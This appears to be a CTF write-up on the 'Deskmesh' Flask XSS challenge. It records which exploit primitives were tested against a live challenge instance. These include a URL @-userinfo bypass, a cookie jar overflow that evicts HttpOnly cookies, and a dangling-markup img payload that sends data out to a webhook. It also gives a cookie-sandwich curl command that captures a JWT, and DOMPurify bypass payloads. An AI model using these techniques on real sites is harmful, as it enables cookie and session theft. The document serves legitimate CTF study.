# Deskmesh-style Flask Dual-Port XSS Challenge Pattern

Author: Jerit3787. Seen in CTF 2026 (HackNyx CTF, 470 pts, 0 solves globally as of June 2026).

## Live Chrome 149 Confirmation (2026-06-22 second remote instance)

A NEW remote instance was spun up at `19ad969b-5699-44b5-8d6b-e4e62be80f55.35.187.237.219.sslip.io:8001` on 2026-06-22 with the SAME code as the HackNyx instance. Empirical findings from this second instance:

- ✅ **URL @-userinfo bypass works on live Chrome 149**: bot navigates to `http://127.0.0.1:7000@<external-host>/<path>` → request reaches external host (verified via cloudflared quick tunnel, 404 on server log confirms connection)
- ✅ **Ticket creation with arbitrary body to admin works**: `POST /new` with `to=admin` + body containing XSS payload → 303 with ticket UUID
- ✅ **Flag2 readable via loopback from inside container**: `curl http://127.0.0.1:7001/status` returns `HYNX{fake_flag_2}` (server gates on `is_loopback(remote_addr)`)
- ❌ **DOMPurify 3.3.1 mXSS / CRLF still blocked** — same empirical verdict as HackNyx session. The intended XSS bootstrap chain remains unsolvable on Chrome 149.

**Recommendation:** do NOT attempt this challenge on remote Chrome 149 with the intended XSS path unless a newer DOMPurify bypass (post-3.4.4 GHSA-87xg-pxx2-7hvx variants, or Chrome 149-specific regressions) is published. The empirical ceiling has been hit. Move to other challenges.

**Working alternative paths** (require specific deployment topology):
- **Local instance only**: SQLite hash rewrite (Werkzeug `generate_password_hash` → UPDATE agents table → login as admin → /escalate → JWT decode). Requires DB on disk — only true on local instances, NOT on remote CTF containers.
- **Direct loopback access** to /escalate or /status: only works from inside the same network namespace as the challenge container.

## Architecture
- Main app on port 7000 (external: 8001), status/banner on port 7001
- Same host → cookies are shared (host-scoped, not port-scoped)
- Bot (Selenium HeadlessChrome 149 from Debian Bookworm) logs in as admin, visits /escalate, then user-controlled URL
- Bot URL must pass `url.startswith("http://127.0.0.1:7000")` check

## Key Techniques

### 1. URL @-userinfo bypass
`http://127.0.0.1:7000@evil.com/path` passes Python `startswith()` check but browser navigates to `evil.com/path` (userinfo is ignored by browser for the actual connection target).

**Empirically verified (June 2026, multiple sessions):** Works on Chrome 147 and Chromium 149 (Debian Bookworm). The bot lands on `evil.com` with empty cookies for that origin; bot's existing cookies for the inner `127.0.0.1:7000` host remain in the jar and can be sent on same-origin requests initiated from attacker pages. Headless Chrome does NOT show userinfo warnings. Confirmed on live remote (2026-06-22 second instance).

### 2. ❌ CRLF header injection in bot URL — does NOT work in modern Chrome (88+)

**Historical claim (now WRONG):** URL-encoded CRLF (`%0d%0a`) in the bot URL was said to inject HTTP headers when the browser makes the request.

**Empirical reality (verified Chrome 147 + Chromium 149 in Bookworm, June 2026, both sessions):**
- Chrome percent-encodes CRLF in the URL path before sending: `GET /path%0d%0aX-Custom:%20value HTTP/1.1` — CRLF stays URL-encoded, server sees it as literal `%0d%0a` in the path string.
- Werkzeug parses the path as a literal string; the percent-encoded CRLF becomes a 404/400, NOT a header separator.
- Raw CRLF bytes via CDP `Page.navigate` are also blocked: Chrome's URL parser rejects control characters before they reach the network layer.
- Variations tested and confirmed blocked: `%0d%0a`, `%0a`, `%0d`, raw CRLF in path, CRLF in query string, tab `%09`, space `%20`, `;` and `&` separators.
- This technique last reliably worked in Chrome ≤87 (early 2021). All modern Chromium is patched.

**What to try instead when an API sink requires a custom HTTP header from the bot's browser:**
1. Find an existing same-origin `fetch()` in the app's own JS that already sets the header. The Deskmesh queue page's `api()` function sets `X-Desk-Action: view` automatically when fetching `/api/tickets/<id>` — leverage this via `window.open` + queue page popup from a `@-userinfo` target URL.
2. Look for a body-reflected sink that doesn't require any custom header (e.g., `{{ banner | safe }}` on a status page) — see Dangling Markup.
3. For older-Chromium CTF challenges (pre-2021), check the chrome version in the Dockerfile — `python:3.12-slim` (Bookworm) ships chromium 149, so CRLF is definitely blocked there.

**Quick empirical check before relying on CRLF:**
```python
# Send the bot URL with CRLF and inspect the raw HTTP request on your logging server:
driver.get("http://target/api/path%0d%0aX-Injected:value")
# If the logging server's request log shows TWO lines ("GET /api/path" and "X-Injected: value"),
# CRLF worked. If it shows ONE line with the percent-encoded path, it didn't.
```

### 3. API endpoint as XSS sink
`/api/tickets/<id>` with `X-Desk-Action: view` header returns JSON as `text/html` (Flask default when no mimetype set) with fallback CSP `script-src 'unsafe-inline'`. Ticket body containing `<script>` tags executes when browser renders the response as HTML.

### 4. Cookie jar overflow to evict HttpOnly cookies
Set ~200 cookies via `document.cookie` to overflow Chrome's per-domain cookie jar (~180 limit). Oldest cookies (including HttpOnly ones set by the server) get evicted. Then set your own cookie with the same name — it becomes the only one Flask reads.

### 5. Dangling markup exfiltration via banner cookie
Status page renders `{{ banner | safe }}` with CSP `img-src http: https:`. Set banner cookie to:
```
<img src="https://webhook/exfil?d=
```
Browser captures all subsequent HTML (including the flag) into the img `src` attribute until the next `"` character. The flag text gets sent as part of the image request URL.

### 6. Chrome Private Network Access (PNA)
- HTTPS→private IP fetch: BLOCKED (preflight required, no PNA header on target)
- HTTP→private IP fetch: NOT blocked in Chrome 149 (PNA preflight only enforced for secure contexts)
- Top-level navigation (any context): ALWAYS allowed regardless of PNA
- `document.cookie` assignment: DOM operation, not network — works regardless of CSP connect-src

## Exploit Chain (Flag 2) — INTENDED per reference, BROKEN in modern Chromium

Per the reference, the intended chain is:
1. Create ticket to admin with `<script>` payload (cookie overflow + banner set + navigate)
2. Use CRLF injection in bot URL: `http://127.0.0.1:7000/api/tickets/<ID>%0d%0aX-Desk-Action:%20view`
3. Bot navigates to API endpoint, browser renders as HTML, script executes
4. Script overflows cookie jar (evicts HttpOnly banner), sets new banner with dangling `<img src=...`
5. Script navigates to `http://127.0.0.1:7001/status`
6. Status page renders flag + dangling img → flag exfiltrated via image request URL

**⚠ Step 2 (CRLF injection) does NOT work on Chrome 88+ as of June 2026.** See section 2 above. The chain as written is broken on current Chromium. To still trigger XSS on the API sink, find a same-origin code path that already sets `X-Desk-Action: view` (the queue page's `api()` does this) and route through it.

## CSP Summary
| Page | script-src | connect-src | img-src | form-action |
|------|-----------|-------------|---------|-------------|
| Non-queue (fallback) | unsafe-inline | none (default) | none | not set |
| Queue | nonce-... | self | none | not set |
| Status (port 7001) | not set (blocked) | not set | http: https: | not set |
| API endpoint (sink) | unsafe-inline | none (default) | none | not set |

## DOMPurify 3.3.1 Notes (verified June 2026)
- **CVE-2025-26791** (`<math>/<table>/<mglyph>/<style>` namespace confusion): requires `SAFE_FOR_TEMPLATES: true` + `CUSTOM_ELEMENT_HANDLING`. Queue page uses default config → CVE does NOT fire.
- **GHSA-87xg-pxx2-7hvx** (selectedcontent re-clone): affects DOMPurify 3.4.4+ (where `selectedcontent` is in default ALLOWED_TAGS), NOT 3.3.1. The reference's claim that this works on 3.3.1 is incorrect.
- **Backtick-script test 102** (the test case added in 3.3.3 fix): the alleged bypass payload `<img src="x` `<script>alert(102)</script>">` HTML-encodes the script to `&lt;script&gt;` in Chrome 147 — does NOT fire alert. The bypass works only in specific parsers (likely jsdom or older browsers), not in current Chromium.
- **Empirical result:** all standard DOMPurify 3.3.1 default-config payloads (`<noscript><!-- </noscript><img onerror=...>`, `<xmp><p title="</xmp><img onerror=...>`, etc.) sanitize to safe output in Chrome 147. There is NO known mXSS that works against DOMPurify 3.3.1 default config in current Chrome.
- Even if a mXSS did fire on the queue page, its CSP (`script-src 'nonce-...'`, `default-src 'none'`) blocks all event handlers and inline scripts. mXSS on queue page = HTML injection only (e.g., `<meta http-equiv="refresh">`), which is insufficient to exfiltrate an HttpOnly cookie.

## See also
- `references/deskmesh-actual-exploitability-2026.md` — full empirical findings from the HackNyx CTF session: which attack paths were attempted, which primitives work, which blockers remain.
- `references/bot-xss-html-hosting-constraints.md` — service matrix for ephemeral HTML hosting during bot-XSS challenges (Cloudflare Workers recommended; cloudflared quick tunnel is the free alternative).

## Update 2026-06-22: cookie sandwich verification + cache replay dead end

**Cookie sandwich primitive VERIFIED via synthetic Cookie header (June 22 2026):**

```bash
curl -H $'Cookie: banner="%3Cimg%20src%3D\'http://127.0.0.1:8123/%3Fx%3D; auth=JWT.TEST.TOKEN; banner=%27%3E%22' \
     http://target:7001/status
# Response body: <p><img src='http://127.0.0.1:8123/?x=; auth=JWT.TEST.TOKEN; banner='></p>
```

Werkzeug correctly parses the unclosed `"` in banner #1, reads until the closing `"` in banner #2, and includes the auth JWT in between. The unclosed `'` in banner #2's URL-encoded value is what closes the img `src=` attribute. The `auth=JWT.TEST.TOKEN` is captured in the URL.

This works on Werkzeug 3.0.6 (live, Python 3.12.13, June 2026). Once you have same-origin JS on 127.0.0.1:7000, this is deterministic and exfils BOTH flag2 (from the page body) AND the admin JWT (from the auth cookie) in one image request.

**Cache replay (teammate's proposed bootstrap) is DEAD in Chrome 142/149 (June 22 2026):**

The teammate's idea: `/queue` page's `api()` fetch returns the API response as text/html with the body, browser caches it, then bot's navigation to the same API URL reuses the cache → body renders as HTML → script fires.

Empirical test: server returns DIFFERENT responses based on `X-Test` header. `fetch('/api/x', {headers:{'X-Test':'A'}}).then(()=>location.href='/api/x')` resulted in TWO requests with different headers — no cache reuse. The Flask response has no `Cache-Control`, no `Last-Modified`, no `ETag`, so it's "stale" immediately. Chrome 142 + 149 don't reuse the fetch cache for top-level navigation.

**Live test result:** 0 hits on webhook.site for every cache-replay bot submission (multiple XSS payload variants tried: `<script>`, `<meta refresh>`, `<img>`). The bootstrap is structurally broken — the bot's `WebDriverWait` for `#queue-page` (h1 in static HTML) completes BEFORE `DOMContentLoaded` fires, so the queue's `api()` fetch is never even started (or is canceled by the next navigation).

**Net result:** Cookie sandwich works, cache replay doesn't. Bootstrap XSS on 127.0.0.1:7000 remains the missing piece. See `references/deskmesh-cookie-xss-patterns.md` for the full 2026-06-22 update and `~/Documents/Obsidian Vault/Challenges/deskmesh.md` for the consolidated challenge note.
